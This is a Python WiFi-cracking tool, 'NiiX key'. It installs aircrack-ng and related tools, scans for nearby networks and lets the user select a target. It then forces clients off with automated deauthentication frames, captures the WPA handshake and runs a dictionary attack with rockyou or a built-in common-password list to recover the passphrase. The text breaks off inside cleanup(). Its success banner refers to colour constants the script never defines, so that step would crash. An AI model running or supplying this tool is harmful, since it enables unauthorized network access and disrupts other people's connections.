#!/usr/bin/env python3

# NiiX key - WiFi Script
# Created by: cuteLiLi / techniix / QuacK
# Version: beta 2.0 

import subprocess
from collections import namedtuple
import os
import sys
import time
import platform
import shutil
import importlib
import tempfile
import json
import re
import threading

# ─────────────────────────────────────────────
#  ANSI colour & style helpers
# ─────────────────────────────────────────────
class C:
    RESET    = '\033[0m'
    BOLD     = '\033[1m'
    DIM      = '\033[2m'
    RED      = '\033[31m'
    GREEN    = '\033[32m'
    YELLOW   = '\033[33m'
    BLUE     = '\033[34m'
    MAGENTA  = '\033[35m'
    CYAN     = '\033[36m'
    WHITE    = '\033[37m'
    BRED     = '\033[91m'
    BGREEN   = '\033[92m'
    BYELLOW  = '\033[93m'
    BBLUE    = '\033[94m'
    BMAGENTA = '\033[95m'
    BCYAN    = '\033[96m'
    BWHITE   = '\033[97m'

def c(text, *codes):
    return ''.join(codes) + str(text) + C.RESET

def ok(msg):   print(f"  {c('✔', C.BGREEN, C.BOLD)}  {c(msg, C.BGREEN)}")
def info(msg): print(f"  {c('◆', C.BCYAN,  C.BOLD)}  {c(msg, C.CYAN)}")
def warn(msg): print(f"  {c('▲', C.BYELLOW,C.BOLD)}  {c(msg, C.BYELLOW)}")
def err(msg):  print(f"  {c('✘', C.BRED,   C.BOLD)}  {c(msg, C.BRED)}")
def ask(msg):  return input(f"  {c('?', C.BMAGENTA, C.BOLD)}  {c(msg, C.BMAGENTA, C.BOLD)} ")

def section(title):
    w     = 62
    pad   = (w - len(title) - 4) // 2
    side  = c('─' * pad, C.BLUE, C.BOLD)
    label = c(f' {title} ', C.BWHITE, C.BOLD)
    print(f"\n{side}{c('[', C.BLUE, C.BOLD)}{label}{c(']', C.BLUE, C.BOLD)}{side}\n")

def divider():
    print(c('─' * 62, C.BLUE, C.DIM))


# ─────────────────────────────────────────────
#  Real-time progress bar (background thread)
# ─────────────────────────────────────────────
class ProgressBar:
    def __init__(self, total_seconds, label='Working', width=38):
        self.total   = total_seconds
        self.label   = label
        self.width   = width
        self._stop   = threading.Event()
        self._thread = threading.Thread(target=self._run, daemon=True)

    def start(self):
        self._start = time.time()
        self._thread.start()
        return self

    def stop(self):
        self._stop.set()
        self._thread.join()
        self._render(self.total, self.total)   # lock to 100 %
        print()

    def _render(self, elapsed, total):
        pct    = min(elapsed / total, 1.0)
        filled = int(self.width * pct)
        empty  = self.width - filled
        bar    = c('█' * filled, C.BCYAN, C.BOLD) + c('░' * empty, C.DIM)
        p_str  = c(f'{pct*100:5.1f}%', C.BWHITE, C.BOLD)
        remain = max(0, int(total - elapsed))
        eta    = c(f'{remain:3d}s', C.BYELLOW)
        lbl    = c(self.label, C.CYAN, C.BOLD)
        print(f"\r  {lbl}  [{bar}] {p_str}  ETA {eta}  ", end='', flush=True)

    def _run(self):
        while not self._stop.is_set():
            elapsed = time.time() - self._start
            self._render(elapsed, self.total)
            time.sleep(0.2)

# Try to import scapy at module level
try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Track monitor interface globally so cleanup can find it
MONITOR_IFACE = None

# Define a named tuple to store network information
Network = namedtuple('Network', ['ssid', 'bssid', 'channel', 'signal'])


class LinuxDistroDetector:
    """Detect and handle different Linux distributions."""

    DISTROS = {
        'kali': {
            'name': 'Kali Linux',
            'pkg_manager': 'apt-get',
            'install_cmd': ['apt-get', 'install', '-y'],
            'update_cmd': ['apt-get', 'update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpasupplicant',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-venv',
                'libpcap_dev': 'libpcap-dev',
            }
        },
        'ubuntu': {
            'name': 'Ubuntu',
            'pkg_manager': 'apt-get',
            'install_cmd': ['apt-get', 'install', '-y'],
            'update_cmd': ['apt-get', 'update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpasupplicant',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-venv',
                'python3_dev': 'python3-dev',
                'libpcap_dev': 'libpcap-dev',
            }
        },
        'debian': {
            'name': 'Debian',
            'pkg_manager': 'apt-get',
            'install_cmd': ['apt-get', 'install', '-y'],
            'update_cmd': ['apt-get', 'update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpasupplicant',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-venv',
                'libpcap_dev': 'libpcap-dev',
            }
        },
        'arch': {
            'name': 'Arch Linux',
            'pkg_manager': 'pacman',
            'install_cmd': ['pacman', '-S', '--noconfirm', '--needed'],
            'update_cmd': ['pacman', '-Sy'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python-scapy',
                'hcxtools': 'hcxtools',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpa_supplicant',
                'pip': 'python-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python-virtualenv',
                'libpcap_dev': 'libpcap',
            }
        },
        'fedora': {
            'name': 'Fedora',
            'pkg_manager': 'dnf',
            'install_cmd': ['dnf', 'install', '-y'],
            'update_cmd': ['dnf', 'check-update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpa_supplicant',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-virtualenv',
                'python3_dev': 'python3-devel',
                'libpcap_dev': 'libpcap-devel',
            }
        },
        'rhel': {
            'name': 'RHEL/CentOS/Rocky',
            'pkg_manager': 'dnf',
            'install_cmd': ['dnf', 'install', '-y'],
            'update_cmd': ['dnf', 'check-update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpa_supplicant',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-virtualenv',
                'python3_dev': 'python3-devel',
                'libpcap_dev': 'libpcap-devel',
            }
        },
    }

    @staticmethod
    def detect_distro():
        """Detect the Linux distribution."""
        try:
            if os.path.exists('/etc/os-release'):
                with open('/etc/os-release', 'r') as f:
                    content = f.read().lower()

                if 'kali' in content:
                    return LinuxDistroDetector.DISTROS['kali']
                elif 'arch' in content or 'manjaro' in content or 'endeavouros' in content:
                    return LinuxDistroDetector.DISTROS['arch']
                elif 'fedora' in content:
                    return LinuxDistroDetector.DISTROS['fedora']
                elif 'centos' in content or 'rhel' in content or 'rocky' in content or 'almalinux' in content:
                    return LinuxDistroDetector.DISTROS['rhel']
                elif 'ubuntu' in content:
                    ubuntu_info = LinuxDistroDetector.DISTROS['ubuntu'].copy()
                    for line in content.split('\n'):
                        if 'version_id' in line:
                            try:
                                version = line.split('=')[1].strip().strip('"')
                                if int(version.split('.')[0]) >= 23:
                                    ubuntu_info['needs_venv'] = True
                            except Exception:
                                pass
                    return ubuntu_info
                elif 'debian' in content:
                    return LinuxDistroDetector.DISTROS['debian']

            # Fallback: detect by which package manager exists
            if shutil.which('pacman'):
                return LinuxDistroDetector.DISTROS['arch']
            elif shutil.which('dnf'):
                return LinuxDistroDetector.DISTROS['fedora']
            elif shutil.which('apt-get'):
                return LinuxDistroDetector.DISTROS['debian']

            return LinuxDistroDetector.DISTROS['debian']

        except Exception as e:
            warn(f"Could not detect distribution: {e}")
            return LinuxDistroDetector.DISTROS['debian']


def get_os():
    """Detect operating system."""
    system = platform.system()
    if system == "Linux":
        distro_info = LinuxDistroDetector.detect_distro()
        return distro_info['name']
    return "Unknown"


def check_pkg_manager(distro_info):
    """Check if package manager is available."""
    pkg_manager = distro_info['pkg_manager']
    if shutil.which(pkg_manager):
        return True
    # Try alternatives
    for alt in ['apt-get', 'apt', 'pacman', 'dnf', 'yum']:
        if shutil.which(alt):
            distro_info['install_cmd'][0] = alt
            distro_info['update_cmd'][0] = alt
            return True
    return False


def run_command(cmd, show_output=True, timeout=300):
    """Run a command and return result. Timeout is 5 minutes by default for installs."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        if show_output and result.stdout:
            print(result.stdout)
        if show_output and result.stderr:
            print(f"Stderr: {result.stderr}")
        return result.returncode == 0, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        err(f"Command timed out: {' '.join(cmd)}")
        return False, "", "Timeout"
    except Exception as e:
        err(f"Command error: {e}")
        return False, "", str(e)


def install_system_package(distro_info, package_key):
    """Install a system package."""
    try:
        package_name = distro_info['pkg_names'].get(package_key)
        if not package_name:
            # Key not defined for this distro — silently skip
            return True

        cmd = ['sudo'] + distro_info['install_cmd'] + [package_name]
        info(f"Installing {package_name}...")

        success, stdout, stderr = run_command(cmd, show_output=False)

        if success:
            ok(f"Installed {package_name}")
            return True
        else:
            err(f"Failed to install {package_name}: {stderr.strip()[:120]}")
            return False

    except Exception as e:
        err(f"Error installing {package_key}: {e}")
        return False


def install_pip_package(package_name):
    """Install Python package via pip, trying multiple strategies."""
    pip_cmd = None
    for cmd in ['pip3', 'pip']:
        if shutil.which(cmd):
            pip_cmd = cmd
            break

    if not pip_cmd:
        err("pip not found")
        return False

    strategies = [
        [pip_cmd, 'install', package_name],
        [pip_cmd, 'install', '--break-system-packages', package_name],
        ['python3', '-m', 'pip', 'install', package_name],
        ['python3', '-m', 'pip', 'install', '--break-system-packages', package_name],
    ]

    for strategy in strategies:
        cmd = ['sudo'] + strategy
        info(f"Trying: {' '.join(cmd)}")
        success, stdout, stderr = run_command(cmd, show_output=False)
        if success:
            ok(f"Installed {package_name} via pip")
            return True

    err(f"All pip strategies failed for {package_name}")
    return False


def get_monitor_interface(base_interface):
    """Detect the actual monitor interface name created by airmon-ng."""
    # Give airmon-ng a moment to create the interface
    time.sleep(2)

    candidates = [
        f"{base_interface}mon",
        f"{base_interface}mon0",
    ]

    # Also check 'iw dev' for any monitor-mode interface
    try:
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
        if result.returncode == 0:
            iface = None
            in_iface = False
            for line in result.stdout.split('\n'):
                line = line.strip()
                if line.startswith('Interface'):
                    iface = line.split()[1]
                    in_iface = True
                elif in_iface and 'type monitor' in line:
                    if iface and iface not in candidates:
                        candidates.insert(0, iface)
                    in_iface = False
                elif line == '':
                    in_iface = False
    except Exception:
        pass

    for c in candidates:
        if os.path.exists(f'/sys/class/net/{c}'):
            return c

    # Fallback
    return f"{base_interface}mon"


def create_virtual_env():
    """Create a Python virtual environment."""
    venv_path = '/tmp/niixkey_venv'
    try:
        if os.path.exists(venv_path):
            shutil.rmtree(venv_path)

        info(f"Creating virtual environment at {venv_path}...")
        success, stdout, stderr = run_command(['python3', '-m', 'venv', venv_path])
        if not success:
            err(f"Failed to create venv: {stderr}")
            return None

        python_path = os.path.join(venv_path, 'bin', 'python3')
        if not os.path.exists(python_path):
            err("Virtual environment not created properly")
            return None

        ok("Virtual environment created")
        return venv_path

    except Exception as e:
        err(f"Error creating virtual environment: {e}")
        return None


def install_in_virtual_env(venv_path, package_name):
    """Install package inside a virtual environment."""
    pip_path = os.path.join(venv_path, 'bin', 'pip')
    if not os.path.exists(pip_path):
        err("pip not found in venv")
        return False

    info(f"Installing {package_name} in virtual environment...")
    success, stdout, stderr = run_command([pip_path, 'install', package_name], show_output=False)
    if success:
        ok(f"Installed {package_name} in venv")
        return True
    err(f"Failed to install {package_name} in venv: {stderr.strip()[:120]}")
    return False


def check_and_install_scapy(distro_info):
    """Install scapy using multiple fallback strategies."""
    global SCAPY_AVAILABLE

    if SCAPY_AVAILABLE:
        ok("scapy is already installed and importable")
        return True

    warn("scapy not found — attempting installation...")

    def _try_import_scapy():
        """Attempt to import scapy and update globals. Returns True on success."""
        global SCAPY_AVAILABLE
        importlib.invalidate_caches()
        try:
            import scapy.all as _sa
            import scapy.layers.dot11 as _sd11
            # Inject the needed names into the module's global namespace
            g = sys.modules[__name__].__dict__
            for name in dir(_sa):
                g[name] = getattr(_sa, name)
            g['Dot11'] = _sd11.Dot11
            g['Dot11Beacon'] = _sd11.Dot11Beacon
            g['Dot11Elt'] = _sd11.Dot11Elt
            SCAPY_AVAILABLE = True
            return True
        except ImportError:
            return False

    # Strategy 1: System package
    info("Strategy 1: System package...")
    if install_system_package(distro_info, 'scapy'):
        if _try_import_scapy():
            ok("scapy importable after system install")
            return True
        err("System package installed but cannot import")

    # Strategy 2: pip
    info("Strategy 2: pip install...")
    if install_pip_package('scapy'):
        if _try_import_scapy():
            ok("scapy importable after pip install")
            return True
        err("pip installed but cannot import")

    # Strategy 3: virtualenv
    info("Strategy 3: Virtual environment...")
    install_system_package(distro_info, 'python3_venv')
    venv_path = create_virtual_env()
    if venv_path and install_in_virtual_env(venv_path, 'scapy'):
        venv_site = os.path.join(
            venv_path, 'lib',
            f'python{sys.version_info.major}.{sys.version_info.minor}',
            'site-packages'
        )
        if os.path.exists(venv_site):
            sys.path.insert(0, venv_site)
            if _try_import_scapy():
                ok("scapy importable from virtual environment")
                return True
            err("Cannot import from venv")

    err("All scapy installation strategies failed")
    return False


def check_tool(tool_name):
    """Check if a CLI tool is available."""
    return shutil.which(tool_name) is not None


def check_all_dependencies():
    """Check if all required tools are available."""
    # hcxpcapngtool is the modern name; older versions use hcxpcaptool
    required_tools = [
        'airmon-ng',
        'airodump-ng',
        'aireplay-ng',
        'aircrack-ng',
        'iw',
    ]

    missing_tools = [t for t in required_tools if not check_tool(t)]

    # hcxtools binary name varies
    if not check_tool('hcxpcapngtool') and not check_tool('hcxpcaptool'):
        missing_tools.append('hcxpcapngtool/hcxpcaptool')

    global SCAPY_AVAILABLE
    if not SCAPY_AVAILABLE:
        missing_tools.append('scapy (python)')

    if missing_tools:
        err(f"Missing: {', '.join(missing_tools)}")
        return False

    return True


def install_dependencies():
    """Install all necessary dependencies."""
    info("Installing dependencies...")

    distro_info = LinuxDistroDetector.detect_distro()
    info(f"Detected distro: {distro_info['name']}")

    if not check_pkg_manager(distro_info):
        err("No supported package manager found")
        return False

    try:
        # Update package database (ignore errors for dnf check-update which returns 100 when updates exist)
        info("Updating package database...")
        update_cmd = ['sudo'] + distro_info['update_cmd']
        run_command(update_cmd, show_output=False)

        essential_packages = [
            'pip',
            'iw',
            'net_tools',
            'aircrack',
            'hcxtools',
            'libpcap_dev',
        ]

        optional_packages = [
            'python3_dev',
            'python3_venv',
            'hashcat',
            'reaver',
            'wpasupplicant',
        ]

        for pkg_key in essential_packages:
            install_system_package(distro_info, pkg_key)

        for pkg_key in optional_packages:
            install_system_package(distro_info, pkg_key)

        # Install scapy (critical for scanning)
        print("\n[*] Installing scapy...")
        if not check_and_install_scapy(distro_info):
            print("\n[!] WARNING: Could not install scapy properly")
            response = input("[?] Continue anyway? (y/n): ")
            if response.lower() != 'y':
                return False

        # Verify
        print("\n[*] Verifying installed tools...")
        tools_to_check = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng', 'iw']
        verified = [t for t in tools_to_check if check_tool(t)]
        missing = [t for t in tools_to_check if not check_tool(t)]

        if verified:
            ok(f"Verified: {', '.join(verified)}")
        if missing:
            warn(f"Still missing: {', '.join(missing)}")

        if len(missing) > 2:
            err("Too many critical tools missing")
            return False

        return True

    except Exception as e:
        err(f"Error installing dependencies: {e}")
        return False


def get_wireless_interfaces():
    """Get available wireless interfaces."""
    interfaces = []

    # Method 1: iw dev
    if check_tool('iw'):
        try:
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'Interface' in line:
                        iface = line.split()[1]
                        if iface not in interfaces:
                            interfaces.append(iface)
        except Exception:
            pass

    # Method 2: ip link
    try:
        result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                parts = line.split(':')
                if len(parts) >= 2:
                    iface = parts[1].strip().split('@')[0]
                    if iface.startswith(('wl', 'wlan', 'wlp', 'wlx')):
                        if iface not in interfaces:
                            interfaces.append(iface)
    except Exception:
        pass

    # Method 3: /sys/class/net
    try:
        for iface in os.listdir('/sys/class/net'):
            wireless_path = f'/sys/class/net/{iface}/wireless'
            if os.path.exists(wireless_path) and iface not in interfaces:
                interfaces.append(iface)
    except Exception:
        pass

    # Filter out monitor interfaces already running
    interfaces = [i for i in interfaces if not i.endswith('mon') and 'mon0' not in i]

    return interfaces


SCAN_DURATION = 15  # seconds for scapy sniff

def scan_networks(interface):
    """Scan for WiFi networks using scapy (with progress bar) or iw fallback."""
    global SCAPY_AVAILABLE, MONITOR_IFACE

    info(f"Scanning on interface  {c(interface, C.BWHITE, C.BOLD)}")

    if not SCAPY_AVAILABLE:
        warn("Scapy unavailable — using iw fallback scan")
        return scan_networks_alternative(interface)

    networks = []

    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            try:
                ssid = "<Hidden>"
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 0:
                        if elt.info:
                            ssid = elt.info.decode('utf-8', errors='ignore')
                        break
                    elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt, 'payload') else None

                bssid = pkt.addr2

                channel = None
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 3 and elt.info:
                        channel = elt.info[0] if isinstance(elt.info, (bytes, bytearray)) else ord(elt.info)
                        break
                    elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt, 'payload') else None

                signal = -100
                if hasattr(pkt, 'dBm_AntSignal'):
                    signal = pkt.dBm_AntSignal

                networks.append(Network(ssid=ssid, bssid=bssid, channel=channel, signal=signal))

            except Exception:
                pass

    try:
        info("Enabling monitor mode…")
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                       capture_output=True, timeout=10)
        subprocess.run(['sudo', 'airmon-ng', 'start', interface],
                       capture_output=True, text=True, timeout=15)

        monitor_iface = get_monitor_interface(interface)
        MONITOR_IFACE = monitor_iface
        ok(f"Monitor interface ready  {c(monitor_iface, C.BWHITE, C.BOLD)}")
        print()

        # ── progress bar runs while scapy sniffs ──
        pb = ProgressBar(SCAN_DURATION, label='Scanning airspace')
        pb.start()
        sniff(iface=monitor_iface, prn=packet_handler, timeout=SCAN_DURATION)
        pb.stop()

        subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_iface],
                       capture_output=True, timeout=10)
        MONITOR_IFACE = None
        restart_network_manager()

    except Exception as e:
        err(f"Scapy scan error: {e}")
        warn("Falling back to iw scan…")
        if MONITOR_IFACE:
            subprocess.run(['sudo', 'airmon-ng', 'stop', MONITOR_IFACE],
                           capture_output=True, timeout=5)
            MONITOR_IFACE = None
        restart_network_manager()
        return scan_networks_alternative(interface)

    # Deduplicate and sort
    unique_nets = {}
    for net in networks:
        if net.bssid not in unique_nets or net.signal > unique_nets[net.bssid].signal:
            unique_nets[net.bssid] = net

    result_list = sorted(unique_nets.values(), key=lambda x: x.signal, reverse=True)

    if not result_list:
        warn("No networks from scapy scan — trying iw fallback…")
        return scan_networks_alternative(interface)

    return result_list


def scan_networks_alternative(interface):
    """Alternative network scanning using iw scan (with progress bar)."""
    info("Using iw scan method…")
    networks = []

    IW_TIMEOUT = 30
    pb = ProgressBar(IW_TIMEOUT, label='Scanning  (iw) ')
    pb.start()

    try:
        cmd = ['sudo', 'iw', 'dev', interface, 'scan']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=IW_TIMEOUT + 5)
        pb.stop()

        if result.returncode != 0:
            err(f"iw scan failed: {result.stderr.strip()[:200]}")
            return []

        lines = result.stdout.split('\n')
        current_bssid   = None
        current_ssid    = None
        current_signal  = -100
        current_channel = None

        for line in lines:
            ls = line.strip()

            bss_match = re.match(r'BSS\s+([0-9a-fA-F:]{17})', ls)
            if bss_match:
                if current_bssid and current_ssid:
                    networks.append(Network(
                        ssid=current_ssid, bssid=current_bssid,
                        channel=current_channel, signal=current_signal
                    ))
                current_bssid   = bss_match.group(1)
                current_ssid    = '<Unknown>'
                current_signal  = -100
                current_channel = None

            elif 'signal:' in ls.lower():
                m = re.search(r'signal:\s*([-\d.]+)', ls, re.IGNORECASE)
                if m:
                    try: current_signal = int(float(m.group(1)))
                    except Exception: pass

            elif 'DS Parameter set: channel' in ls:
                m = re.search(r'channel\s+(\d+)', ls)
                if m:
                    try: current_channel = int(m.group(1))
                    except Exception: pass

            elif re.match(r'SSID:', ls):
                try: current_ssid = ls.split(':', 1)[1].strip() or '<Hidden>'
                except Exception: pass

        if current_bssid and current_ssid:
            networks.append(Network(
                ssid=current_ssid, bssid=current_bssid,
                channel=current_channel, signal=current_signal
            ))

    except subprocess.TimeoutExpired:
        pb.stop()
        err("iw scan timed out")
    except Exception as e:
        pb.stop()
        err(f"Alternative scan failed: {e}")

    return sorted(networks, key=lambda x: x.signal, reverse=True)


def display_networks_menu(networks):
    """Display a styled networks table and return the chosen index."""
    if not networks:
        err("No networks found")
        return -1

    display_limit = min(20, len(networks))
    nets = networks[:display_limit]

    section(f"Available Networks  ·  {len(networks)} found")

    hdr = (f"  {c('#', C.BWHITE, C.BOLD):>3}  "
           f"{c('SSID', C.BWHITE, C.BOLD):<28}  "
           f"{c('BSSID', C.BWHITE, C.BOLD):17}  "
           f"{c('Ch', C.BWHITE, C.BOLD):>3}  "
           f"{c('Signal', C.BWHITE, C.BOLD):>7}  "
           f"{c('Quality', C.BWHITE, C.BOLD)}")
    print(hdr)
    divider()

    for i, net in enumerate(nets, 1):
        raw_ssid = net.ssid or '<Hidden>'
        ssid     = (raw_ssid[:25] + c('…', C.DIM)) if len(raw_ssid) > 25 else raw_ssid
        ch       = str(net.channel) if net.channel else c('?', C.DIM)
        bssid    = net.bssid or c('??:??:??:??:??:??', C.DIM)
        sig      = net.signal

        if sig >= -55:
            sig_col = C.BGREEN;  bars = '▂▄▆█'
        elif sig >= -70:
            sig_col = C.BYELLOW; bars = '▂▄▆░'
        elif sig >= -80:
            sig_col = C.YELLOW;  bars = '▂▄░░'
        else:
            sig_col = C.BRED;    bars = '▂░░░'

        num_s  = c(f'{i:>3}', C.BYELLOW, C.BOLD)
        ssid_s = c(f'{ssid:<28}', C.BWHITE)
        bss_s  = c(f'{bssid:17}', C.DIM)
        ch_s   = c(f'{ch:>3}', C.BCYAN)
        sig_s  = c(f'{sig:>4} dBm', sig_col)
        bar_s  = c(f'  {bars}', sig_col, C.BOLD)

        print(f"  {num_s}  {ssid_s}  {bss_s}  {ch_s}  {sig_s}{bar_s}")

    divider()
    print()

    while True:
        try:
            raw = ask(f"Select target (1–{display_limit}) or q to quit:")
            if raw.strip().lower() == 'q':
                return -1
            choice = int(raw.strip())
            if 1 <= choice <= display_limit:
                return choice - 1
            warn(f"Please enter a number between 1 and {display_limit}")
        except ValueError:
            warn("Invalid input — enter a number")


def restart_network_manager():
    """Restart network manager service."""
    services = ['NetworkManager', 'networkmanager', 'network-manager',
                'wpa_supplicant', 'networking']
    for svc in services:
        try:
            subprocess.run(['sudo', 'systemctl', 'restart', svc],
                           capture_output=True, timeout=8)
        except Exception:
            pass


def capture_handshake(interface, bssid, channel, ssid):
    """Capture WPA handshake using airodump-ng."""
    global MONITOR_IFACE

    HANDSHAKE_TIMEOUT = 300   # 5 minutes max

    info(f"Target  {c(ssid, C.BWHITE, C.BOLD)}  ·  {c(bssid, C.CYAN)}  ·  Ch {c(str(channel), C.BCYAN)}")

    safe_ssid    = re.sub(r'[^\w\-]', '_', ssid)[:30] or 'network'
    capture_file = f"handshake_{safe_ssid}"

    airodump_proc     = None
    monitor_iface     = None
    handshake_captured = False

    try:
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                       capture_output=True, timeout=10)

        info(f"Enabling monitor mode on {c(interface, C.BWHITE)}…")
        subprocess.run(['sudo', 'airmon-ng', 'start', interface, str(channel)],
                       capture_output=True, timeout=15)

        monitor_iface  = get_monitor_interface(interface)
        MONITOR_IFACE  = monitor_iface
        ok(f"Monitor interface  {c(monitor_iface, C.BWHITE, C.BOLD)}")

        cmd = [
            'sudo', 'airodump-ng',
            '--bssid', bssid,
            '--channel', str(channel),
            '-w', capture_file,
            '--output-format', 'pcap',
            monitor_iface
        ]
        airodump_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print()
        info(f"Capture file:  {c(capture_file + '-01.cap', C.BYELLOW)}")
        info(f"Tip — force reconnect:  {c(f'sudo aireplay-ng --deauth 10 -a {bssid} {monitor_iface}', C.DIM)}")
        info("Press  Ctrl+C  to stop early")
        print()

        start_time  = time.time()
        deauth_sent = False

        pb = ProgressBar(HANDSHAKE_TIMEOUT, label='Capturing handshake')
        pb.start()

        while not handshake_captured and (time.time() - start_time) < HANDSHAKE_TIMEOUT:
            if airodump_proc.poll() is not None:
                pb.stop()
                err("airodump-ng stopped unexpectedly")
                break

            elapsed = time.time() - start_time
            if elapsed > 30 and not deauth_sent:
                try:
                    subprocess.run(
                        ['sudo', 'aireplay-ng', '--deauth', '5', '-a', bssid, monitor_iface],
                        capture_output=True, timeout=15
                    )
                    deauth_sent = True
                except Exception:
                    pass

            for suffix in ['-01.cap', '-02.cap', '-03.cap', '.cap']:
                cap_file = f"{capture_file}{suffix}"
                if os.path.exists(cap_file) and os.path.getsize(cap_file) > 100:
                    chk = subprocess.run(['aircrack-ng', cap_file],
                                         capture_output=True, text=True)
                    if 'WPA (1 handshake)' in chk.stdout or 'WPA (2 handshake' in chk.stdout:
                        handshake_captured = True
                        pb.stop()
                        ok(f"Handshake captured!  {c(cap_file, C.BWHITE)}")
                        break

            if not handshake_captured:
                time.sleep(5)

        if not handshake_captured:
            pb.stop()

    except KeyboardInterrupt:
        try: pb.stop()
        except Exception: pass
        print()
        warn("Capture interrupted by user")

    finally:
        if airodump_proc and airodump_proc.poll() is None:
            airodump_proc.terminate()
            time.sleep(1)
        if monitor_iface:
            subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_iface],
                           capture_output=True, timeout=10)
            MONITOR_IFACE = None
        restart_network_manager()

    if handshake_captured:
        return capture_file
    else:
        err("No handshake captured")
        return None


def crack_wpa_password(capture_file, bssid):
    """Crack WPA password using aircrack-ng."""
    info(f"Starting dictionary attack on  {c(bssid, C.BCYAN)}")

    cap_files = [
        f for f in os.listdir('.')
        if f.startswith(capture_file) and f.endswith('.cap')
    ]

    if not cap_files:
        err("No capture files found")
        return None

    cap_file = sorted(cap_files)[0]
    info(f"Capture file:  {c(cap_file, C.BWHITE)}")

    wordlist_candidates = [
        '/usr/share/wordlists/rockyou.txt',
        '/usr/share/wordlists/rockyou.txt.gz',
        '/usr/share/john/password.lst',
        '/usr/share/dict/words',
        '/opt/wordlists/rockyou.txt',
        '/usr/share/wordlists/fasttrack.txt',
    ]

    wordlist = next((w for w in wordlist_candidates if os.path.exists(w)), None)

    if not wordlist:
        warn("No wordlist found — generating a small test wordlist…")
        wordlist = '/tmp/niixkey_test_passwords.txt'
        common = [
            'password', '12345678', 'admin', 'qwerty', '123456789',
            'password123', 'letmein', 'welcome', 'monkey', '1234567890',
            'abc123', 'password1', '12345', 'iloveyou', 'sunshine',
            'princess', 'admin123', 'wifi123', 'home1234', 'network1',
        ]
        with open(wordlist, 'w') as f:
            f.write('\n'.join(common))
        info(f"Test wordlist written: {c(wordlist, C.DIM)}")

    info(f"Wordlist:  {c(wordlist, C.BWHITE)}")
    print()
    info(c("Running aircrack-ng — this may take a while…", C.DIM))
    divider()

    try:
        cmd = ['aircrack-ng', '-a', '2', '-b', bssid, '-w', wordlist, cap_file]
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )

        password = None
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                line = output.strip()
                if line:
                    # Highlight key lines
                    if 'KEY FOUND!' in line:
                        print(f"  {c(line, C.BGREEN, C.BOLD)}")
                    elif 'Current passphrase' in line or 'Tested' in line:
                        print(f"  {c(line, C.DIM)}", end='\r')
                    else:
                        print(f"  {c(line, C.DIM)}")
                if 'KEY FOUND!' in output:
                    m = re.search(r'\[\s*(.+?)\s*\]', output)
                    if m:
                        password = m.group(1).strip()
                    break

        process.wait()
        divider()

        if password:
            print()
            print(f"  {c('▓' * 60, C.BGREEN, C.BOLD)}")
            print(f"  {c('PASSWORD CRACKED', C.BG_GREEN + C.BLACK + C.BOLD):^60}")
            print(f"  {c('▓' * 60, C.BGREEN, C.BOLD)}")
            print()
            print(f"  {c('Network ', C.DIM)}{c(bssid, C.BCYAN, C.BOLD)}")
            print(f"  {c('Password', C.DIM)} {c(password, C.BGREEN, C.BOLD)}")
            print()
            return password
        else:
            err("Password not found in wordlist")
            return None

    except Exception as e:
        err(f"Error during cracking: {e}")
        return None


def cleanup():
    """Cleanup resources and restore network."""
    global MONITOR_IFACE
    print()
    info("Cleaning up…")

    if MONITOR_IFACE:
        try:
